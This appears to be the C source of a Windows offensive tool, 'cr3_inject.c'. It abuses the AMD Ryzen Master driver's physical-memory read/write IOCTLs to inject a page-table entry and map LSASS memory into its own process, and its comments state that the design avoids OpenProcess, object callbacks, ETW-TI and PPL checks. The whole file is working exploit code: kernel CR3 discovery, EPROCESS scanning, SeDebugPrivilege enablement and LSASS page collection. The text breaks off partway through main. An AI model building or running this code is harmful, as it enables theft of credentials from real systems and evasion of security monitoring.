/*
 * cr3_inject.c  —  PML4 entry injection via AMD physical R/W
 *
 * Technique: inject one user-half PML4 entry directly into own process's
 * EXISTING page table, mapping LSASS physical pages into our VA space.
 * Zero OpenProcess, zero OB callbacks, zero ETW-TI, zero PPL bypass.
 * After one-time setup (3 phys_write calls), reads are bare pointer derefs.
 *
 * Why NOT swap EPROCESS.DirectoryTableBase (the cr3_swap.c approach, BSOD):
 *   Swapping DTB replaces the live PML4 with a static snapshot. Windows
 *   demand-pages kernel-half PML4 entries per-process: new entries go into
 *   EPROCESS.DTB-pointed PML4, which is now our snapshot. A DPC/ISR running
 *   in our context accessing a kernel VA that was demand-paged AFTER the
 *   snapshot → PML4 entry 0 → kernel page fault at DISPATCH_LEVEL → BSOD.
 *
 * Why this approach is safe:
 *   We never touch DTB. Our own PML4 stays live — the OS updates it normally.
 *   We add one entry in an unused user-half slot (VAs the OS knows nothing
 *   about). Cleanup removes that one entry. Zero structural disruption.
 *
 * Why no TLB flush before reading:
 *   The injected PML4 slot was empty (never accessed). The TLB has no cached
 *   translation for those VAs — not even a "not-present" entry (negative TLB
 *   caching only happens on explicitly accessed ranges). First access causes
 *   a hardware page-table walk, which reads our newly written PML4 entry.
 *   x86-64 TSO guarantees our phys_write store is visible to the subsequent
 *   page-table-walk load on the same logical CPU. No Sleep needed pre-read.
 *   Sleep IS needed post-remove to flush the TLB entry we populated.
 *
 * Compared to physmem2profit / MemProcFS:
 *   Both bypass OpenProcess and read LSASS via physical memory. Difference:
 *   those tools issue one IOCTL per page (monitorable driver I/O). This
 *   technique: after 3 phys_write calls, all reads have zero kernel transitions.
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -O2 -Wall -Wno-unused-function \
 *       -o cr3_inject.exe cr3_inject.c
 *
 * Usage:
 *   cr3_inject.exe              map first 16 lsass.exe image pages → lsass_inject.bin
 *   cr3_inject.exe <pa_hex>     map one specific physical page (4KB aligned)
 *
 * Requires: AMDRyzenMasterDriverV20 loaded. Admin rights.
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <inttypes.h>

/* ══════════════════════════════════════════════════════════════════════════
 * §1  AMD DRIVER PRIMITIVES
 * ══════════════════════════════════════════════════════════════════════════ */

#define DEVICE_NAME      L"\\\\.\\AMDRyzenMasterDriverV20"
#define IOCTL_PHYS_READ  0x81112F08u
#define IOCTL_PHYS_WRITE 0x81112F0Cu
static HANDLE g_dev = INVALID_HANDLE_VALUE;

#define MAX_RANGES 64
typedef struct { uint64_t base, size; } PhysRange;
static PhysRange g_ranges[MAX_RANGES];
static int       g_nranges = 0;

static void load_ranges(void)
{
    HKEY h;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
            0, KEY_READ, &h) != ERROR_SUCCESS) return;

    char vname[256]; DWORD vn, vd, type;
    uint8_t *buf = NULL; DWORD sz = 0;
    for (DWORD i = 0; ; i++) {
        vn = sizeof vname; vd = 0;
        if (RegEnumValueA(h,i,vname,&vn,NULL,&type,NULL,&vd) == ERROR_NO_MORE_ITEMS) break;
        if ((type != 3 && type != 8) || vd < 20) continue;
        buf = (uint8_t*)malloc(vd); if (!buf) continue;
        if (RegQueryValueExA(h,vname,NULL,NULL,buf,&vd) == ERROR_SUCCESS) { sz = vd; break; }
        free(buf); buf = NULL;
    }
    RegCloseKey(h);
    if (!buf || sz < 20) { free(buf); return; }

    DWORD cnt = *(DWORD*)(buf + 16);
    uint8_t *p = buf + 20;
    for (DWORD i = 0; i < cnt && g_nranges < MAX_RANGES; i++, p += 20) {
        if (p + 20 > buf + sz || p[0] != 3) continue;
        g_ranges[g_nranges].base = *(uint64_t*)(p + 4);
        g_ranges[g_nranges].size = *(uint64_t*)(p + 12);
        printf("  [range %d]  PA 0x%012"PRIX64" + %"PRIu64" MB\n",
               g_nranges,
               g_ranges[g_nranges].base,
               g_ranges[g_nranges].size >> 20);
        g_nranges++;
    }
    free(buf);
}

static int pa_in_range(uint64_t pa, uint32_t sz)
{
    for (int i = 0; i < g_nranges; i++)
        if (pa >= g_ranges[i].base && pa + sz <= g_ranges[i].base + g_ranges[i].size)
            return 1;
    return 0;
}

#define IO_BUFSZ (4096 + 12)
static uint8_t g_io_buf[IO_BUFSZ];

static int phys_read(uint64_t pa, void *buf, uint32_t sz)
{
    uint8_t in[12];
    *(uint64_t*)in = pa; *(uint32_t*)(in + 8) = sz;

    uint32_t osz = 12 + sz;
    uint8_t *out; void *dyn = NULL;
    if (osz <= IO_BUFSZ) out = g_io_buf;
    else { dyn = malloc(osz); if (!dyn) return 0; out = (uint8_t*)dyn; }

    DWORD got = 0;
    BOOL ok = DeviceIoControl(g_dev, IOCTL_PHYS_READ, in, 12, out, osz, &got, NULL);
    if (ok && got >= 12) memcpy(buf, out + 12, sz);
    free(dyn);
    return ok && got >= 12;
}

static int phys_write(uint64_t pa, const void *data, uint32_t sz)
{
    if (!pa_in_range(pa, sz)) {
        printf("  [!] BLOCKED write PA 0x%"PRIX64" — not in RAM range\n", pa);
        return 0;
    }
    uint32_t isz = 12 + sz;
    uint8_t *in = (uint8_t*)malloc(isz); if (!in) return 0;
    *(uint64_t*)in = pa; *(uint32_t*)(in + 8) = sz;
    memcpy(in + 12, data, sz);
    DWORD got = 0;
    BOOL ok = DeviceIoControl(g_dev, IOCTL_PHYS_WRITE, in, isz, NULL, 0, &got, NULL);
    free(in);
    return ok;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §2  PAGE TABLE WALK
 * ══════════════════════════════════════════════════════════════════════════ */

static uint64_t g_kernel_cr3 = 0;

/*
 * cr3_walk — software emulation of hardware page-table walk.
 *
 * Reads FULL 4KB pages at each level (not 8-byte entries).
 * The AMD Ryzen Master driver's phys_read IOCTL fails on small reads
 * (<= ~16 bytes) for certain physical pages (page-table pages specifically
 * appear to need full-page reads on Hyper-V). Reading the entire 4KB page
 * and extracting the entry in software costs 4 IOCTLs per walk but is
 * reliable across all tested configurations.
 *
 * Handles 1GB (PDPT PS=1) and 2MB (PD PS=1) large pages.
 * Returns PA of the VA, or 0 if any level not present / unreadable.
 */
static uint64_t cr3_walk(uint64_t cr3, uint64_t va)
{
    static uint8_t pg[4096];
    uint64_t base = cr3 & ~0xFFFULL;
    uint64_t e, idx;

    /* PML4 */
    idx = (va >> 39) & 0x1FF;
    if (!phys_read(base, pg, 4096)) return 0;
    e = ((uint64_t *)pg)[idx];
    if (!(e & 1)) return 0;
    base = e & 0x000FFFFFFFFFF000ULL;

    /* PDPT — 1GB large page if PS=1 */
    idx = (va >> 30) & 0x1FF;
    if (!phys_read(base, pg, 4096)) return 0;
    e = ((uint64_t *)pg)[idx];
    if (!(e & 1)) return 0;
    if (e & (1ULL << 7)) return (e & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFF);
    base = e & 0x000FFFFFFFFFF000ULL;

    /* PD — 2MB large page if PS=1 */
    idx = (va >> 21) & 0x1FF;
    if (!phys_read(base, pg, 4096)) return 0;
    e = ((uint64_t *)pg)[idx];
    if (!(e & 1)) return 0;
    if (e & (1ULL << 7)) return (e & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFF);
    base = e & 0x000FFFFFFFFFF000ULL;

    /* PT */
    idx = (va >> 12) & 0x1FF;
    if (!phys_read(base, pg, 4096)) return 0;
    e = ((uint64_t *)pg)[idx];
    if (!(e & 1)) return 0;
    return (e & 0x000FFFFFFFFFF000ULL) | (va & 0xFFF);
}

static uint64_t kva_to_pa(uint64_t va) { return cr3_walk(g_kernel_cr3, va); }

static uint64_t get_ntoskrnl_va(void)
{
    typedef NTSTATUS (NTAPI *NtQSI_t)(ULONG, PVOID, ULONG, PULONG);
    NtQSI_t fn = (NtQSI_t)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                           "NtQuerySystemInformation");
    if (!fn) return 0;

    typedef struct {
        HANDLE S; PVOID MB, IB; ULONG IS, F;
        USHORT L, I, Lc, O; CHAR P[256];
    } MOD;
    typedef struct { ULONG C; MOD M[1]; } MODLIST;

    ULONG sz = 0x40000; MODLIST *ml = NULL; NTSTATUS st;
    do {
        free(ml); ml = (MODLIST*)malloc(sz *= 2);
        if (!ml) return 0;
        st = fn(11, ml, sz, NULL);
    } while (st == (NTSTATUS)0xC0000004L);

    uint64_t va = (st == 0) ? (uint64_t)ml->M[0].IB : 0;
    free(ml);
    return va;
}

static uint64_t find_kernel_cr3(uint64_t nt_va)
{
    uint32_t nt_slot = nt_va ? (uint32_t)((nt_va >> 39) & 0x1FF) : 0;
    static uint8_t pg[4096];

    /* Pass 1: classic self-ref at slot 0x1ED (pre-Win10-1703).
     * Read full page — AMD driver may reject sub-page reads on Hyper-V. */
    for (int ri = 0; ri < g_nranges; ri++) {
        if (g_ranges[ri].base >= 0x10000000ULL) continue;
        uint64_t re = g_ranges[ri].base + g_ranges[ri].size;
        if (re > 0x10000000ULL) re = 0x10000000ULL;
        for (uint64_t pa = g_ranges[ri].base; pa < re; pa += 0x1000) {
            if (!phys_read(pa, pg, 4096)) continue;
            uint64_t e = *(uint64_t *)(pg + 0x1ED * 8);
            if (!((e & 1) && (e & 0x000FFFFFFFFFF000ULL) == pa)) continue;
            if (nt_slot) {
                uint64_t ke = *(uint64_t *)(pg + nt_slot * 8);
                if (!(ke & 1)) continue;
            }
            return pa;
        }
    }

    /* Pass 2: randomised self-ref slot (Win10-1703+ / Win11 22H2+), first 64 MB */
    for (int ri = 0; ri < g_nranges; ri++) {
        if (g_ranges[ri].base >= 0x4000000ULL) continue;
        uint64_t re = g_ranges[ri].base + g_ranges[ri].size;
        if (re > 0x4000000ULL) re = 0x4000000ULL;
        for (uint64_t pa = g_ranges[ri].base; pa < re; pa += 0x1000) {
            if (!phys_read(pa, pg, 4096)) continue;
            for (int idx = 0x100; idx < 0x200; idx++) {
                uint64_t e = *(uint64_t*)(pg + idx * 8);
                if (!(e & 1)) continue;
                if ((e & 0x000FFFFFFFFFF000ULL) != pa) continue;
                if (nt_slot) {
                    uint64_t ke = *(uint64_t*)(pg + nt_slot * 8);
                    if (!(ke & 1)) continue;
                }
                return pa;
            }
        }
    }

    if (nt_va) return find_kernel_cr3(0);
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §3  EPROCESS HELPERS
 * ══════════════════════════════════════════════════════════════════════════ */

#define OFF_DTB   0x028u
#define OFF_PID   0x440u
#define OFF_FLINK 0x448u
#define OFF_NAME  0x5A8u

static void enable_debug_priv(void)
{
    HANDLE tok = NULL;
    if (!OpenProcessToken(GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok)) return;
    TOKEN_PRIVILEGES tp = {1};
    if (LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &tp.Privileges[0].Luid))
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(tok, FALSE, &tp, sizeof tp, NULL, NULL);
    CloseHandle(tok);
}

static uint64_t scan_eproc_physical(uint32_t pid, const char *name)
{
    static const struct { uint32_t off_pid, off_name; } layouts[] = {
        {0x440, 0x5A8},   /* Win10-1903+ / Win11 incl. 26200 */
        {0x2E8, 0x450},   /* Win10-1709/1803/1809 */
        {0x2E0, 0x448},   /* Win10-1507-1703 */
    };
    size_t nlen = strlen(name); if (nlen > 14) nlen = 14;

    uint8_t *buf = (uint8_t*)malloc(8192);
    if (!buf) return 0;

    uint64_t result = 0;
    for (int ri = 0; ri < g_nranges && !result; ri++) {
        uint64_t rend = g_ranges[ri].base + g_ranges[ri].size;
        for (uint64_t pa = g_ranges[ri].base; pa < rend && !result; pa += 4096) {
            uint32_t rd = (pa + 8192 <= rend) ? 8192 : 4096;
            if (!phys_read(pa, buf, rd)) continue;

            for (uint32_t off = 0; off + 24 <= 4096; off += 8) {
                uint64_t v; memcpy(&v, buf + off, 8);
                if ((uint32_t)v != pid || (v >> 32)) continue;

                uint64_t fl, bl;
                memcpy(&fl, buf + off + 8,  8);
                memcpy(&bl, buf + off + 16, 8);
                if ((fl >> 48) != 0xFFFF || (bl >> 48) != 0xFFFF) continue;
                if ((fl & 7) || (bl & 7) || fl == bl) continue;

                for (int li = 0; li < 3; li++) {
                    int64_t ep = (int64_t)off - (int64_t)layouts[li].off_pid;
                    if (ep < 0) continue;
                    uint64_t nm_off = (uint64_t)ep + layouts[li].off_name;
                    if (nm_off + 15 > (uint64_t)rd) continue;
                    char nm[16] = {0}; memcpy(nm, buf + nm_off, 15);
                    if (_strnicmp(nm, name, nlen) != 0) continue;
                    uint64_t eproc_pa = pa + (uint64_t)ep;
                    if (eproc_pa & 0xF) continue;
                    printf("  [scan] EPROCESS PA=0x%012"PRIX64"  layout=%d  name='%s'\n",
                           eproc_pa, li, nm);
                    result = eproc_pa;
                    break;
                }
                if (result) break;
            }
        }
    }
    free(buf);
    return result;
}

static uint64_t find_own_eproc_pa(void)
{
    typedef NTSTATUS (NTAPI *NtQSI_t)(ULONG, PVOID, ULONG, PULONG);
    NtQSI_t fn = (NtQSI_t)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                           "NtQuerySystemInformation");
    if (fn) {
        HANDLE hself = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE,
                                   GetCurrentProcessId());
        if (hself) {
            /* Use class 0x40 (SystemExtendedHandleInformation) — ULONG_PTR fields
         * avoid USHORT Handle truncation for handles > 65535 on Win11 64-bit */
            typedef struct {
                ULONG_PTR Object;
                ULONG_PTR UniqueProcessId;
                ULONG_PTR HandleValue;
                ACCESS_MASK GrantedAccess;
                USHORT CreatorBackTraceIndex;
                USHORT ObjectTypeIndex;
                ULONG HandleAttributes;
                ULONG Reserved;
            } SHE;
            typedef struct { ULONG_PTR Count; ULONG_PTR Reserved2; SHE H[1]; } SHI;

            ULONG sz = 0x40000; SHI *info = NULL; NTSTATUS st;
            do {
                free(info); info = (SHI*)malloc(sz *= 2);
                if (!info) break;
                st = fn(0x40, info, sz, NULL);
            } while (st == (NTSTATUS)0xC0000004L);

            uint64_t kva = 0;
            if (info && st == 0) {
                ULONG_PTR pid = (ULONG_PTR)GetCurrentProcessId();
                ULONG_PTR h   = (ULONG_PTR)(uintptr_t)hself;
                for (ULONG_PTR i = 0; i < info->Count; i++)
                    if (info->H[i].UniqueProcessId == pid && info->H[i].HandleValue == h)
                        { kva = (uint64_t)info->H[i].Object; break; }
            }
            free(info);
            CloseHandle(hself);

            if (kva) {
                uint64_t pa = kva_to_pa(kva);
                if (pa) {
                    printf("  [*] Own EPROCESS via HandleInfo+kva_to_pa\n");
                    return pa;
                }
                printf("  [!] kva_to_pa=0 (Hyper-V SLAT?) — falling back to RAM scan\n");
            }
        }
    }

    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, sizeof path);
    char *p = strrchr(path, '\\');
    const char *exe = p ? p + 1 : path;
    printf("  [*] RAM scan (PID=%lu name='%s')...\n",
           (unsigned long)GetCurrentProcessId(), exe);
    return scan_eproc_physical(GetCurrentProcessId(), exe);
}

static uint64_t find_proc_pa(uint64_t start_pa, const char *tname, uint32_t tpid)
{
    uint8_t buf[0x5C0];
    uint64_t cur = start_pa;
    for (int iter = 0; iter < 2048; iter++) {
        if (!phys_read(cur, buf, sizeof buf)) break;
        uint64_t fl; memcpy(&fl, buf + OFF_FLINK, 8);
        if ((fl >> 48) != 0xFFFF) break;
        uint64_t next_kva = fl - OFF_FLINK;
        uint64_t next_pa  = kva_to_pa(next_kva);
        if (!next_pa || next_pa == start_pa) break;

        uint8_t nb[0x5C0];
        if (!phys_read(next_pa, nb, sizeof nb)) { cur = next_pa; continue; }

        uint64_t pv; memcpy(&pv, nb + OFF_PID, 8);
        char nm[16] = {0}; memcpy(nm, nb + OFF_NAME, 15);

        if ((tpid && (uint32_t)pv == tpid) || (tname && _stricmp(nm, tname) == 0)) {
            printf("  [+] Found '%s' PID=%u  PA=0x%012"PRIX64"\n",
                   nm, (uint32_t)pv, next_pa);
            return next_pa;
        }
        cur = next_pa;
    }
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §4  USER DTB DETECTION
 *
 * On non-KPTI (bare-metal AMD): EPROCESS+0x028 maps both halves.
 * On KPTI / AMD inside Hyper-V: +0x028 is kernel-only CR3 — user-half
 * entries 0-255 are all zero. UserDirectoryTableBase is at another offset.
 * We detect which is correct by probing cr3_walk on a known user VA.
 * ══════════════════════════════════════════════════════════════════════════ */

static uint64_t find_user_dtb(uint64_t eproc_pa, uint64_t test_va)
{
    uint32_t pml4_idx = (uint32_t)((test_va >> 39) & 0x1FF);
    printf("  [diag] test_va=0x%016"PRIX64"  PML4_idx=%u\n", test_va, pml4_idx);

    /* Pass 1: known offsets — print raw value + PML4 entry for visibility */
    static const uint32_t offs[] = {
        0x028, 0x388, 0x380, 0x390, 0x398,
    };
    for (int i = 0; i < 5; i++) {
        uint64_t dtb = 0;
        int rd = phys_read(eproc_pa + offs[i], &dtb, 8);
        int valid = dtb && !(dtb & 0xFFF) && pa_in_range(dtb, 4096);
        printf("  [diag] EPROCESS+0x%03X = 0x%016"PRIX64
               "  rd=%d  %s\n",
               offs[i], dtb, rd, valid ? "[valid PA]" : "");
        if (!valid) continue;

        uint64_t pml4_e = 0;
        int prd = phys_read(dtb + pml4_idx * 8, &pml4_e, 8);
        printf("         PML4[%u] @ 0x%012"PRIX64" = 0x%016"PRIX64
               "  rd=%d  %s\n",
               pml4_idx, dtb + pml4_idx * 8, pml4_e, prd,
               (pml4_e & 1) ? "[PRESENT]" : "[not present — KPTI or wrong DTB]");
        if (!(pml4_e & 1)) continue;

        uint64_t probe = cr3_walk(dtb, test_va);
        if (probe) {
            printf("  [dtb] EPROCESS+0x%03X = 0x%012"PRIX64
                   " -> PA 0x%012"PRIX64"%s\n",
                   offs[i], dtb, probe,
                   offs[i] == 0x028 ? "" : "  [UserDTB]");
            return dtb;
        }
    }

    /* Pass 2: brute-force entire EPROCESS[0x028..0x800] for any PA that
     * resolves test_va.  Catches non-standard UDTB offsets on new builds. */
    printf("  [diag] Brute-forcing EPROCESS[0x028..0x800] for user CR3...\n");
    uint8_t epbuf[0x800];
    if (phys_read(eproc_pa, epbuf, sizeof epbuf)) {
        for (uint32_t off = 0x028; off + 8 <= (uint32_t)sizeof epbuf; off += 8) {
            uint64_t v; memcpy(&v, epbuf + off, 8);
            if (!v || (v & 0xFFF) || !pa_in_range(v, 4096)) continue;
            uint64_t probe = cr3_walk(v, test_va);
            if (probe) {
                printf("  [dtb] BRUTE-FORCE FOUND EPROCESS+0x%03X = 0x%012"PRIX64
                       " -> PA 0x%012"PRIX64"\n", off, v, probe);
                return v;
            }
        }
    } else {
        printf("  [diag] phys_read(EPROCESS) failed — SLAT blocking data page?\n");
    }

    printf("  [-] find_user_dtb: exhausted all candidates for VA 0x%016"PRIX64"\n",
           test_va);
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §5  PTE FLAG CONSTANTS
 *
 * x86-64 rule: a page is user-accessible only if U/S=1 at EVERY level
 * (PML4E, PDPTE, PDE, PTE). One supervisor-level ancestor makes the whole
 * chain ring-0 only, regardless of the leaf PTE.
 *
 * PTE_TABLE: non-leaf entries (PML4→PDPT→PD→PT)
 *   bit 0  Present
 *   bit 1  R/W
 *   bit 2  U/S = 1  ← required at every level for ring-3 access
 *   bit 5  Accessed (pre-set; avoids hardware update race)
 *   bit 6  intentionally 0 on non-leaf (reserved; must be 0)
 *
 * PTE_LEAF: leaf PTE pointing at a data page
 *   same as PTE_TABLE + NX (bit 63) — data-only, no execute
 * ══════════════════════════════════════════════════════════════════════════ */

#define PTE_TABLE  0x27ULL                  /* P + RW + US + Accessed        */
#define PTE_LEAF   (0x27ULL | (1ULL << 63)) /* PTE_TABLE + NX (data page)    */

/* ══════════════════════════════════════════════════════════════════════════
 * §5  PML4 INJECTION
 * ══════════════════════════════════════════════════════════════════════════ */

typedef struct {
    uint8_t  *pdpt_buf, *pd_buf, *pt_buf;  /* pinned user-mode buffers       */
    uint64_t  pdpt_pa,   pd_pa,   pt_pa;   /* their physical addresses        */
    uint32_t  pml4_slot;                    /* chosen PML4 index [2..127]      */
    uint64_t  map_va_base;                  /* (pml4_slot << 39)               */
    uint32_t  n_pages;                      /* number of physical pages mapped */
    uint64_t  inject_entry_pa;             /* PA of own_pml4[pml4_slot]        */
} PmlInject;

/*
 * alloc_pinned — VirtualAlloc 4KB, VirtualLock (pin in RAM), translate VA→PA.
 *
 * We use own_dtb (our EPROCESS.DirectoryTableBase) for VA→PA, not the kernel
 * CR3, because these are user-mode VAs — they only exist in our own PML4.
 */
static uint8_t *alloc_pinned(uint64_t own_dtb, uint64_t *pa_out)
{
    uint8_t *p = (uint8_t*)VirtualAlloc(NULL, 4096,
                                         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!p) { printf("  [-] VirtualAlloc: %lu\n", GetLastError()); return NULL; }

    if (!VirtualLock(p, 4096))
        printf("  [!] VirtualLock failed (%lu) — page may swap under memory pressure\n",
               GetLastError());

    memset(p, 0, 4096);

    *pa_out = cr3_walk(own_dtb, (uint64_t)(uintptr_t)p);
    if (!*pa_out) {
        printf("  [-] cr3_walk(own_dtb, va=0x%p) = 0 — page not committed?\n", p);
        VirtualFree(p, 0, MEM_RELEASE);
        return NULL;
    }
    return p;
}

/*
 * pml_inject — build page table chain and inject one PML4 entry.
 *
 * Write order: PT → PD → PDPT → PML4E.  Bottom-up ensures the hardware
 * page walker never encounters a partially built chain: by the time the
 * CPU sees the PML4 entry, all downstream pages are already in physical
 * memory with valid entries.
 */
static int pml_inject(PmlInject *inj, uint64_t own_eproc_pa,
                       const uint64_t *target_pas, int n_pages)
{
    memset(inj, 0, sizeof *inj);
    if (n_pages > 512) n_pages = 512;

    /* Own user DTB — use find_user_dtb so KPTI systems work.
     * Test VA: our own image base (guaranteed mapped). */
    uint64_t own_test_va = (uint64_t)(uintptr_t)GetModuleHandleA(NULL);
    uint64_t own_dtb = find_user_dtb(own_eproc_pa, own_test_va);
    if (!own_dtb) {
        printf("  [-] Cannot find own user DTB (SLAT blocking page table reads?)\n");
        return 0;
    }

    /* Allocate and pin PDPT / PD / PT pages */
    inj->pdpt_buf = alloc_pinned(own_dtb, &inj->pdpt_pa);
    inj->pd_buf   = alloc_pinned(own_dtb, &inj->pd_pa);
    inj->pt_buf   = alloc_pinned(own_dtb, &inj->pt_pa);
    if (!inj->pdpt_buf || !inj->pd_buf || !inj->pt_buf) return 0;

    printf("  [*] PDPT buf    PA = 0x%012"PRIX64"\n", inj->pdpt_pa);
    printf("  [*] PD   buf    PA = 0x%012"PRIX64"\n", inj->pd_pa);
    printf("  [*] PT   buf    PA = 0x%012"PRIX64"\n", inj->pt_pa);

    /* PT: leaf entries pointing at each target physical page */
    uint64_t *pt = (uint64_t*)inj->pt_buf;
    for (int i = 0; i < n_pages; i++)
        pt[i] = (target_pas[i] & 0x000FFFFFFFFFF000ULL) | PTE_LEAF;

    /* PD[0] → PT,  PDPT[0] → PD */
    ((uint64_t*)inj->pd_buf)[0]   = (inj->pt_pa   & 0x000FFFFFFFFFF000ULL) | PTE_TABLE;
    ((uint64_t*)inj->pdpt_buf)[0] = (inj->pd_pa   & 0x000FFFFFFFFFF000ULL) | PTE_TABLE;

    /* Find first free user-half PML4 slot in [2..127].
     * Slots 0-1: null-ptr / very-low VA territory — skip.
     * Slots 128-254: valid but closer to heap/stack layout on some configs.
     * Slot 255: near 0x7F80000000000, sometimes used by Windows.
     */
    uint64_t pml4_base = own_dtb & ~0xFFFULL;
    uint64_t pml4_user[128];   /* read only user half (1 KB) */
    if (!phys_read(pml4_base, pml4_user, sizeof pml4_user)) {
        printf("  [-] Failed to read own PML4\n");
        return 0;
    }
    for (int i = 2; i < 128; i++) {
        if (!(pml4_user[i] & 1)) { inj->pml4_slot = (uint32_t)i; break; }
    }
    if (!inj->pml4_slot) {
        printf("  [-] No free PML4 slot in [2..127]\n");
        return 0;
    }

    inj->map_va_base      = (uint64_t)inj->pml4_slot << 39;
    inj->n_pages          = (uint32_t)n_pages;
    inj->inject_entry_pa  = pml4_base + (uint64_t)inj->pml4_slot * 8;

    printf("  [*] PML4 slot   = %u → VA base 0x%016"PRIX64"\n",
           inj->pml4_slot, inj->map_va_base);

    /* Write PT chain to physical memory (bottom-up) */
    if (!phys_write(inj->pt_pa,   inj->pt_buf,   4096)) { printf("  [-] phys_write PT\n");   return 0; }
    if (!phys_write(inj->pd_pa,   inj->pd_buf,   4096)) { printf("  [-] phys_write PD\n");   return 0; }
    if (!phys_write(inj->pdpt_pa, inj->pdpt_buf, 4096)) { printf("  [-] phys_write PDPT\n"); return 0; }

    /* Inject PML4 entry — single atomic activation point */
    uint64_t pml4e = (inj->pdpt_pa & 0x000FFFFFFFFFF000ULL) | PTE_TABLE;
    if (!phys_write(inj->inject_entry_pa, &pml4e, 8)) {
        printf("  [-] phys_write PML4 entry\n");
        return 0;
    }

    printf("  [+] PML4[%u]    = 0x%016"PRIX64"\n", inj->pml4_slot, pml4e);
    return 1;
}

/*
 * pml_remove — cleanup in the only safe order.
 *
 * 1. Zero the PML4 entry → injection logically removed.
 * 2. Sleep(10ms) → context switch → KiSwapContext reloads CR3 with same DTB
 *    → CPU issues CR3-write which flushes non-global TLB entries for our PCID.
 *    This is necessary NOW because we populated TLB entries during the read
 *    phase; those entries would otherwise serve stale PAs after VirtualFree
 *    returns the physical pages to the OS pool.
 * 3. VirtualFree — physical pages are now safe to reuse.
 */
static void pml_remove(PmlInject *inj)
{
    uint64_t zero = 0;
    phys_write(inj->inject_entry_pa, &zero, 8);
    printf("  [*] PML4[%u] zeroed — sleeping 10ms for TLB flush\n", inj->pml4_slot);
    Sleep(10);

    if (inj->pdpt_buf) { VirtualUnlock(inj->pdpt_buf, 4096); VirtualFree(inj->pdpt_buf, 0, MEM_RELEASE); }
    if (inj->pd_buf)   { VirtualUnlock(inj->pd_buf,   4096); VirtualFree(inj->pd_buf,   0, MEM_RELEASE); }
    if (inj->pt_buf)   { VirtualUnlock(inj->pt_buf,   4096); VirtualFree(inj->pt_buf,   0, MEM_RELEASE); }
    memset(inj, 0, sizeof *inj);
}

/* ══════════════════════════════════════════════════════════════════════════
 * §6  LSASS PAGE COLLECTION
 * ══════════════════════════════════════════════════════════════════════════ */

static int collect_pages(uint64_t proc_cr3, uint64_t start_va,
                          uint64_t *pas_out, int max_pages)
{
    int n = 0;
    for (int i = 0; i < max_pages; i++) {
        uint64_t va = start_va + (uint64_t)i * 0x1000;
        uint64_t pa = cr3_walk(proc_cr3, va);
        if (!pa) {
            printf("  [~] page %2d  VA 0x%016"PRIX64" — not present, skipped\n", i, va);
            continue;
        }
        pas_out[n++] = pa;
        printf("  [page %2d]  VA 0x%016"PRIX64" → PA 0x%012"PRIX64"\n", i, va, pa);
    }
    return n;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §7  MAIN
 * ══════════════════════════════════════════════════════════════════════════ */

int main(int argc, char *argv[])
{
    printf("=== cr3_inject — PML4 entry injection, zero-handle LSASS reader ===\n\n");
    enable_debug_priv();

    /* Open driver */
    g_dev = CreateFileW(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE,
                        NULL, OPEN_EXISTING, 0, NULL);
    if (g_dev == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open AMD driver: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] Driver opened\n");

    load_ranges();
    if (!g_nranges) { printf("[-] No physical ranges\n"); return 1; }

    /* Kernel CR3 */
    printf("\n[*] Finding kernel CR3...\n");
    g_kernel_cr3 = find_kernel_cr3(get_ntoskrnl_va());
    if (!g_kernel_cr3) { printf("[-] Kernel CR3 not found\n"); return 1; }
    printf("[+] Kernel CR3 = 0x%012"PRIX64"\n\n", g_kernel_cr3);

    /* Own EPROCESS */
    printf("[*] Finding own EPROCESS...\n");
    uint64_t own_eproc_pa = find_own_eproc_pa();
    if (!own_eproc_pa) { printf("[-] Own EPROCESS not found\n"); return 1; }
    printf("[+] Own EPROCESS PA = 0x%012"PRIX64"\n\n", own_eproc_pa);

    /* ── Collect target physical pages ─────────────────────────────────── */
    uint64_t target_pas[64];
    int n_target = 0;

    if (argc >= 2) {
        /* Single-page mode */
        uint64_t pa = (uint64_t)strtoull(argv[1], NULL, 16) & ~0xFFFULL;
        printf("[*] Single-page mode: PA 0x%012"PRIX64"\n\n", pa);
        target_pas[0] = pa;
        n_target = 1;
    } else {
        /* LSASS mode */
        printf("[*] Finding LSASS...\n");
        uint32_t lsass_pid = 0;
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe = {sizeof pe};
            if (Process32First(snap, &pe)) do {
                if (_stricmp(pe.szExeFile, "lsass.exe") == 0)
                    { lsass_pid = pe.th32ProcessID; break; }
            } while (Process32Next(snap, &pe));
            CloseHandle(snap);
        }
        printf("[*] LSASS PID = %u\n", lsass_pid);

        uint64_t lsass_pa = find_proc_pa(own_eproc_pa, "lsass.exe", lsass_pid);
        if (!lsass_pa) {
            printf("  [!] List walk failed — trying RAM scan\n");
            lsass_pa = scan_eproc_physical(lsass_pid, "lsass.exe");
        }
        if (!lsass_pa) { printf("[-] LSASS EPROCESS not found\n"); return 1; }

        /* Get LSASS image base first — needed as test_va for find_user_dtb */
        uint64_t lsass_base = 0;
        snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, lsass_pid);
